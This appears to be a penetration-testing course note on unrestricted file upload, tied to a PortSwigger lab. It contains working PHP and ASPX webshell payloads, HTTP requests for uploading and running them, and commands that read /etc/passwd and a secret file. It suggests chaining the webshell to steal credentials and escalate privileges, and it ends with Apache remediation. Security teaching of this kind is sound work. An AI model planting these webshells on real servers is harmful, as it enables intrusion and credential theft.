---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.02 Unrestricted File Upload — Webshell Upload"
portswigger_labs: ["Remote code execution via web shell upload"]
---

# 22.02 — Unrestricted File Upload: Webshell Upload

## What is it?
When a web application allows users to upload files to the server without validating the file's extension, content, or type, the upload is considered "unrestricted." The most critical consequence of an unrestricted file upload vulnerability is the ability to upload a **webshell**.

A webshell is a malicious script (written in the language the server supports, like PHP, ASP, or JSP) that acts as a backdoor command-line interface. Once uploaded and executed by the server, the attacker can send commands via HTTP requests. The server processes these commands with the privileges of the web service account (e.g., `www-data`), effectively granting the attacker Remote Code Execution (RCE) and full control over the web server.

Think of it like an office building with a mail slot on the front door. If security doesn't check what's being dropped in, someone can drop a remote-controlled robot through the slot. Once inside, they can drive the robot around to read documents, open doors, and cause chaos.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Uploads "shell.php" (Webshell Script)
   ▼
[Web Application (No Validation)]
   │
   │ 2. Saves file to Web Root
   ▼
[File System: /var/www/html/uploads/shell.php]
   │
[Attacker]
   │
   │ 3. Requests GET /uploads/shell.php?cmd=whoami
   ▼
[Web Server]
   │
   │ 4. Executes shell.php via PHP interpreter
   │ 5. Runs the "whoami" command
   │ 6. Returns output
   ▼
[Attacker sees: "www-data"] ──> System Compromised!
```

## How to Find It
- **Manual steps:**
  1. Identify any file upload feature (e.g., profile picture, document submission).
  2. Create a basic webshell script with the appropriate extension for the backend technology (e.g., `.php` for PHP, `.aspx` for .NET, `.jsp` for Java).
  3. Attempt to upload the file directly without any modifications.
  4. If the upload succeeds, try to locate the URL where the file is stored.
  5. Navigate to the URL and provide a command parameter to execute.

- **Tool commands with flags explained:**
  Using `curl` to quickly verify execution:
  ```bash
  # Send a GET request to the uploaded shell
  curl -s "https://target.com/uploads/shell.php?cmd=id"
  
  # If vulnerable, you'll see output like:
  # uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Write a minimal webshell payload.
  2. Upload the file through the application's interface.
  3. Find the upload path (common directories: `/uploads/`, `/images/`, `/media/`, `/wp-content/uploads/`).
  4. Access the file via the browser and execute basic recon commands (`id`, `whoami`, `uname -a`, `ls -la /`).
  5. Use the webshell to read sensitive files (e.g., `/etc/passwd`, application config files containing database credentials).
  6. Upgrade the webshell to a full interactive reverse shell.

- **Actual payloads:**
  **Minimal PHP Webshell:**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  **More Robust PHP Webshell (if `system` is disabled):**
  ```php
  <?php
  if (function_exists('system')) { system($_GET['cmd']); }
  elseif (function_exists('exec')) { exec($_GET['cmd'], $out); echo implode("\n", $out); }
  elseif (function_exists('shell_exec')) { echo shell_exec($_GET['cmd']); }
  elseif (function_exists('passthru')) { passthru($_GET['cmd']); }
  ?>
  ```
  **Minimal ASPX Webshell:**
  ```aspx
  <%@ Page Language="C#" %>
  <% Response.Write(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}.Start().StandardOutput.ReadToEnd()); %>
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: application/x-php

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  **Execution Request:**
  ```http
  GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1
  Host: target.com
  
  HTTP/1.1 200 OK
  
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ```

## Real-World Example
In a typical PortSwigger lab, a blog application allows users to upload avatars. The developers did not implement any checks on the uploaded files. A penetration tester created a file named `exploit.php` containing `<?php echo file_get_contents('/home/carlos/secret'); ?>`. They uploaded the file as their avatar, right-clicked the broken image icon on their profile to get the image URL (`/files/avatars/exploit.php`), and navigated to it. The server executed the PHP code and returned the contents of the secret file, demonstrating a critical Remote Code Execution vulnerability.

## How to Fix It
- **Developer remediation:**
  Unrestricted file uploads are a fundamental security failure. At a minimum, you must validate the file extension against a strict allowlist (e.g., ONLY allow `.jpg`, `.png`, `.pdf`). Furthermore, you should never execute scripts in the upload directory. Configure the web server to serve files in the upload directory as static content only, stripping execution privileges.

- **Code snippet:**
  **Apache Configuration (Disable PHP execution in `/uploads/`):**
  ```apache
  <Directory /var/www/html/uploads>
      # Disable CGI execution
      Options -ExecCGI
      
      # Force PHP and ASP files to be served as plain text, not executed
      RemoveHandler .php .phtml .php3 .php4 .php5 .asp .aspx .jsp
      AddType text/plain .php .phtml .php3 .php4 .php5 .asp .aspx .jsp
  </Directory>
  ```

## Chaining Opportunities
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Once you have a webshell running as `www-data`, check if the user has excessive `sudo` privileges without a password (`sudo -l`). If they do, instantly escalate to full `root` access.
- This vuln + [[10 - Chaining Playbook (Database Credentials)]] → Use the webshell to read the application's configuration file (e.g., `wp-config.php` or `.env`). Extract the database credentials to exfiltrate all user data or pivot to other internal database servers.

## Related Notes
- [[01 - What Makes File Upload Dangerous]]
- [[03 - Content-Type Bypass]]
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
